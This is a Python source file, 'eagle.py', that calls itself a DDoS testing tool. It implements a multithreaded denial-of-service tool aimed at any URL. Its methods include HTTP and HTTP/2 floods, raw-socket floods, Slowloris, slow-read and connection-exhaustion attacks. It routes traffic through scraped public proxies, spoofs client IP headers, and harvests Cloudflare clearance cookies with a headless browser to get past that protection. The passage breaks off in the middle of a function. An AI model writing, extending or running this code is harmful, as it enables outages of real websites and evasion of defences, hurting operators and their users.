# -*- coding: utf-8 -*-
# eagle.py – DDoS Testing Tool
# Usage: python3 eagle.py <method> <target> <threads> <time> [options]

import os
import sys
import threading
import time
import datetime
import random
import socket
import ssl
import logging
from urllib.parse import urlparse

import requests
import cloudscraper
import socks
import httpx
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver

# ------------------------- Global Settings -------------------------
VERSION = "3.0"
LOG_FILE = "eagle.log"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

ua = []
proxies = []
cookieJAR = None
useragent = ""
cookie = ""

# ------------------------- Helper functions -------------------------

def load_user_agents():
    global ua
    try:
        with open('./resources/ua.txt', 'r') as f:
            ua = [line.strip() for line in f if line.strip()]
    except:
        ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]
    logging.info(f"Loaded {len(ua)} User-Agents")

def random_headers():
    referers = [
        "https://google.com/", "https://bing.com/", "https://yahoo.com/",
        "https://duckduckgo.com/", "https://yandex.com/", "https://example.com/"
    ]
    return {
        'User-Agent': random.choice(ua),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'tr-TR,tr;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Referer': random.choice(referers),
    }

def random_small_delay(delay_min=0.05, delay_max=0.3):
    time.sleep(random.uniform(delay_min, delay_max))

def countdown_with_stats(t, stats=None):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    last_total = 0
    while True:
        remaining = (until - datetime.datetime.now()).total_seconds()
        if remaining > 0:
            if stats:
                rps = (stats['total'] - last_total) / 1.0
                last_total = stats['total']
                print(f"\r[*] {remaining:.1f}s | Total: {stats['total']} | RPS: {rps:.1f} | Errors: {stats['errors']}   ", end='')
            else:
                print(f"\r[*] Attack status => {remaining:.1f} sec left ", end='')
            sys.stdout.flush()
        else:
            if stats:
                print(f"\r[*] Attack Done! Total: {stats['total']} | Errors: {stats['errors']}                                   ")
            else:
                print("\r[*] Attack Done !                                   ")
            return
        time.sleep(1)

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path or "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in target['host']:
        target['port'] = target['host'].split(":")[1]
    else:
        target['port'] = "443" if target['scheme'] == "https" else "80"
    return target

def get_proxylist(type):
    if type == "SOCKS5":
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
            r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
            os.makedirs("./resources", exist_ok=True)
            with open("./resources/socks5.txt", 'w') as f:
                f.write(r)
            return [p.strip() for p in r.split('\r\n') if p.strip()]
        except:
            return []
    elif type == "HTTP":
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
            r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
            os.makedirs("./resources", exist_ok=True)
            with open("./resources/http.txt", 'w') as f:
                f.write(r)
            return [p.strip() for p in r.split('\r\n') if p.strip()]
        except:
            return []
    return []

def load_proxies(file_path):
    global proxies
    if not os.path.exists(file_path):
        print(f"[*] Proxy file {file_path} not found.")
        return False
    with open(file_path, 'r') as f:
        proxies = [p.strip() for p in f if p.strip()]
    logging.info(f"Loaded {len(proxies)} proxies from {file_path}")
    return bool(proxies)

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars',
        '--disable-logging', '--disable-login-animations', '--disable-notifications',
        '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for arg in arguments:
        options.add_argument(arg)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        for idx, c in enumerate(cookies):
            if c['name'] == 'cf_clearance':
                cookieJAR = cookies[idx]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                logging.info("CF cookie obtained successfully")
                return True
        time.sleep(1)
    driver.quit()
    logging.warning("Failed to obtain CF cookie")
    return False

def spoof(target):
    addr = [random.randrange(11, 197), random.randrange(0, 255),
            random.randrange(0, 255), random.randrange(2, 254)]
    spoofip = ".".join(map(str, addr))
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )

# ------------------------- Attack methods -------------------------

def LaunchHEAD(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHEAD, args=(url, until, stats, delay, timeout)).start()

def AttackHEAD(url, until_datetime, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchPOST(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackPOST, args=(url, until, stats, delay, timeout)).start()

def AttackPOST(url, until_datetime, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchRAW(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackRAW, args=(url, until, stats, delay, timeout)).start()

def AttackRAW(url, until_datetime, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchPXRAW(url, th, t, stats=None, delay=0.1, timeout=10):
    if not proxies:
        print("[*] No proxies loaded. Use --proxy-file.")
        return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackPXRAW, args=(url, until, stats, delay, timeout)).start()

def AttackPXRAW(url, until_datetime, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = random.choice(proxies) if proxies else None
        if not proxy:
            continue
        proxy_dict = {'http': 'http://' + proxy, 'https': 'http://' + proxy}
        try:
            requests.get(url, proxies=proxy_dict, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchCFB(url, th, t, stats=None, delay=0.1, timeout=15):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        scraper = cloudscraper.create_scraper()
        threading.Thread(target=AttackCFB, args=(url, until, scraper, stats, delay, timeout)).start()

def AttackCFB(url, until_datetime, scraper, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchPXCFB(url, th, t, stats=None, delay=0.1, timeout=15):
    if not proxies:
        print("[*] No proxies loaded.")
        return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        scraper = cloudscraper.create_scraper()
        threading.Thread(target=AttackPXCFB, args=(url, until, scraper, stats, delay, timeout)).start()

def AttackPXCFB(url, until_datetime, scraper, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = random.choice(proxies) if proxies else None
        if not proxy:
            continue
        proxy_dict = {'http': 'http://' + proxy, 'https': 'http://' + proxy}
        try:
            scraper.get(url, proxies=proxy_dict, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchHTTP2(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until, stats, delay, timeout)).start()

def AttackHTTP2(url, until_datetime, stats, delay, timeout):
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchPXHTTP2(url, th, t, stats=None, delay=0.1, timeout=10):
    if not proxies:
        print("[*] No proxies loaded.")
        return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackPXHTTP2, args=(url, until, stats, delay, timeout)).start()

def AttackPXHTTP2(url, until_datetime, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = random.choice(proxies) if proxies else None
        if not proxy:
            continue
        try:
            client = httpx.Client(http2=True, proxies={'http://': 'http://' + proxy, 'https://': 'http://' + proxy})
            client.get(url, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchSOC(url, th, t, stats=None, delay=0.1, timeout=10):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackSOC, args=(target, until, stats, delay, timeout)).start()

def AttackSOC(target, until_datetime, stats, delay, timeout):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            req = (f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
                   f"User-Agent: {random.choice(ua)}\r\n"
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                   "Connection: Keep-Alive\r\n\r\n")
            for _ in range(10):
                s.send(req.encode())
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1
            s.close()
            return

def LaunchPXSOC(url, th, t, stats=None, delay=0.1, timeout=10):
    if not proxies:
        print("[*] No proxies loaded.")
        return
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackPXSOC, args=(target, until, stats, delay, timeout)).start()

def AttackPXSOC(target, until_datetime, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = random.choice(proxies) if proxies else None
        if not proxy:
            continue
        proxy_parts = proxy.split(':')
        if len(proxy_parts) != 2:
            continue
        try:
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, proxy_parts[0], int(proxy_parts[1]))
                s.settimeout(timeout)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, proxy_parts[0], int(proxy_parts[1]))
                s.settimeout(timeout)
                s.connect((target['host'], int(target['port'])))
            req = (f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
                   f"User-Agent: {random.choice(ua)}\r\n"
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                   "Connection: Keep-Alive\r\n\r\n")
            for _ in range(10):
                s.send(req.encode())
            s.close()
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchPPS(url, th, t, stats=None, delay=0.1, timeout=10):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackPPS, args=(target, until, stats, delay, timeout)).start()

def AttackPPS(target, until_datetime, stats, delay, timeout):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                s.send(b"GET / HTTP/1.1\r\n\r\n")
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1
            s.close()
            return

def LaunchSPOOF(url, th, t, stats=None, delay=0.1, timeout=10):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackSPOOF, args=(target, until, stats, delay, timeout)).start()

def AttackSPOOF(target, until_datetime, stats, delay, timeout):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            req = (f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
                   f"User-Agent: {random.choice(ua)}\r\n"
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                   f"{spoof(target)}Connection: Keep-Alive\r\n\r\n")
            for _ in range(10):
                s.send(req.encode())
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1
            s.close()
            return

def LaunchPXSPOOF(url, th, t, proxy_list, stats=None, delay=0.1, timeout=10):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        proxy = random.choice(proxy_list) if proxy_list else ""
        threading.Thread(target=AttackPXSPOOF, args=(target, until, proxy, stats, delay, timeout)).start()

def AttackPXSPOOF(target, until_datetime, proxy, stats, delay, timeout):
    if not proxy:
        return
    proxy_parts = proxy.split(':')
    if len(proxy_parts) != 2:
        return
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, proxy_parts[0], int(proxy_parts[1]))
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, proxy_parts[0], int(proxy_parts[1]))
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            req = (f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
                   f"User-Agent: {random.choice(ua)}\r\n"
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                   f"{spoof(target)}Connection: Keep-Alive\r\n\r\n")
            for _ in range(10):
                s.send(req.encode())
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1
            s.close()
            return
          
def LaunchCFPRO(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    cookies_list = []
    for _ in range(min(int(th), 10)):
        if get_cookie(url):
            cookies_list.append((cookie, cookieJAR))
    if not cookies_list:
        print("[*] No CF cookie obtained, using cloudscraper without cookie")
        for _ in range(int(th)):
            scraper = cloudscraper.create_scraper()
            threading.Thread(target=AttackCFPRO_fallback, args=(url, until, scraper, stats, delay, timeout)).start()
        return
    for i in range(int(th)):
        c, jar = cookies_list[i % len(cookies_list)]
        session = requests.Session()
        scraper = cloudscraper.create_scraper(sess=session)
        jar_obj = RequestsCookieJar()
        jar_obj.set(jar['name'], jar['value'])
        scraper.cookies = jar_obj
        threading.Thread(target=AttackCFPRO, args=(url, until, scraper, stats, delay, timeout)).start()

def AttackCFPRO(url, until_datetime, scraper, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, headers=random_headers(), allow_redirects=False, timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def AttackCFPRO_fallback(url, until_datetime, scraper, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchCFSOC(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    cookies_list = []
    for _ in range(min(int(th), 10)):
        if get_cookie(url):
            cookies_list.append((cookie, cookieJAR))
    if not cookies_list:
        print("[*] No CF cookie obtained, using SOC without cookie (may fail)")
        for _ in range(int(th)):
            threading.Thread(target=AttackSOC, args=(target, until, stats, delay, timeout)).start()
        return
    for i in range(int(th)):
        c, jar = cookies_list[i % len(cookies_list)]
        cookie_str = f"{jar['name']}={jar['value']}"
        threading.Thread(target=AttackCFSOC, args=(target, until, cookie_str, stats, delay, timeout)).start()

def AttackCFSOC(target, until_datetime, cookie_str, stats, delay, timeout):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            req = (f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
                   f"User-Agent: {useragent if useragent else random.choice(ua)}\r\n"
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                   f"Cookie: {cookie_str}\r\n"
                   "Connection: Keep-Alive\r\n\r\n")
            for _ in range(10):
                s.send(req.encode())
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1
            s.close()
            return


def attackSKY(url, timer, threads, stats=None, delay=0.1, timeout=10):
    if not proxies:
        print("[*] No proxies loaded.")
        return
    for _ in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer, stats, delay, timeout)).start()

def LaunchSKY(url, timer, stats, delay, timeout):
    proxy = random.choice(proxies).strip().split(':')
    if len(proxy) != 2:
        return
    timelol = time.time() + int(timer)
    req = (f"GET / HTTP/1.1\r\nHost: {urlparse(url).netloc}\r\n"
           "Cache-Control: no-cache\r\n"
           f"User-Agent: {random.choice(ua)}\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           "Connection: Keep-Alive\r\n\r\n")
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
            s.settimeout(timeout)
            s.connect((urlparse(url).netloc, 443))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            for _ in range(10):
                s.send(req.encode())
            s.close()
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1
            s.close()

def attackSTELLAR(url, timer, threads, stats=None, delay=0.1, timeout=10):
    for _ in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer, stats, delay, timeout)).start()

def LaunchSTELLAR(url, timer, stats, delay, timeout):
    timelol = time.time() + int(timer)
    req = (f"GET / HTTP/1.1\r\nHost: {urlparse(url).netloc}\r\n"
           "Cache-Control: no-cache\r\n"
           f"User-Agent: {random.choice(ua)}\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           "Connection: Keep-Alive\r\n\r\n")
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((urlparse(url).netloc, 443))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            for _ in range(10):
                s.send(req.encode())
            s.close()
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1
            s.close()



def LaunchHTTP2_LARGE(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2_LARGE, args=(url, until, stats, delay, timeout)).start()

def AttackHTTP2_LARGE(url, until_datetime, stats, delay, timeout):
    client = httpx.Client(http2=True)
    large_payload = random._urandom(1024 * 1024)  
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.post(url, headers=random_headers(), data=large_payload, timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchHTTP2_RANGE(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2_RANGE, args=(url, until, stats, delay, timeout)).start()

def AttackHTTP2_RANGE(url, until_datetime, stats, delay, timeout):
    client = httpx.Client(http2=True)
    ranges = ['bytes=0-', 'bytes=0-0', 'bytes=100-200', 'bytes=0-1000', 'bytes=500-']
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            headers = random_headers()
            headers['Range'] = random.choice(ranges)
            client.get(url, headers=headers, timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchSLOWREAD(url, th, t, stats=None, delay=0.1, timeout=10):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackSLOWREAD, args=(target, until, stats, delay, timeout)).start()

def AttackSLOWREAD(target, until_datetime, stats, delay, timeout):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
    except:
        return
    req = (f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
           f"User-Agent: {random.choice(ua)}\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           "Connection: Keep-Alive\r\n\r\n")
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s.send(req.encode())
            s.recv(1) 
            time.sleep(random.uniform(0.5, 2))
            if stats: stats['total'] += 1
        except:
            if stats: stats['errors'] += 1
            s.close()
            return

def LaunchCACHE_BYPASS(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackCACHE_BYPASS, args=(url, until, stats, delay, timeout)).start()

def AttackCACHE_BYPASS(url, until_datetime, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sep = '?' if '?' not in url else '&'
            random_url = f"{url}{sep}{random.randint(100000,999999)}"
            requests.get(random_url, headers=random_headers(), timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchBROKEN_AUTH(url, th, t, stats=None, delay=0.1, timeout=10):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackBROKEN_AUTH, args=(url, until, stats, delay, timeout)).start()

def AttackBROKEN_AUTH(url, until_datetime, stats, delay, timeout):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            headers = random_headers()
            session_id = ''.join(random.choices('abcdef0123456789', k=32))
            headers['Cookie'] = f"sessionid={session_id}; PHPSESSID={random.randint(1000,9999)}"
            requests.get(url, headers=headers, timeout=timeout)
            if stats: stats['total'] += 1
            random_small_delay(delay, delay+0.2)
        except:
            if stats: stats['errors'] += 1

def LaunchCONN_EXHAUST(url, th, t, stats=None, delay=0.1, timeout=10):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackCONN_EXHAUST, args=(target, until, stats, delay, timeout)).start()

def AttackCONN_EXHAUST(target, until_datetime, stats, delay, timeout):
    sockets = []
    try:
        for _ in range(50):
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(timeout)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(timeout)
                s.connect((target['host'], int(target['port'])))
            sockets.append(s)
    except:
        pass
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for s in sockets:
                try:
                    s.send(b"GET / HTTP/1.1\r\nHost: " + target['host'].encode() + b"\r\n\r\n")
                except:
                    pass
            if stats: stats['total'] += len(sockets)
            time.sleep(random.uniform(0.1, 0.5))
        except:
            if stats: stats['errors'] += 1
            break

def LaunchSLOWLORIS(url, th, t, stats=None, delay=0.1, timeout=10):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackSLOWLORIS, args=(target, until, stats, delay, timeout)).start()

def AttackSLOWLORIS(target, until_datetime, stats, delay, timeout):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(timeout)
            s.connect((target['host'], int(target['port'])))
    except:
        return
    req = (f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
           f"User-Agent: {random.choice(ua)}\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           "Connection: Keep-Alive\r\n")
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s.send(req.encode())
            s.send(b"X-Dummy: " + random._urandom(10) + b"\r\n")
            time.sleep(random.uniform(delay, delay+1))
            if stats: stats['total'] += 1
        except:
            if stats: stats['errors'] += 1
            s.close()
            return

def LaunchRUDEAD(url, th, t, stats=None, delay=0.1, timeout=10):
    target = get_target(url)
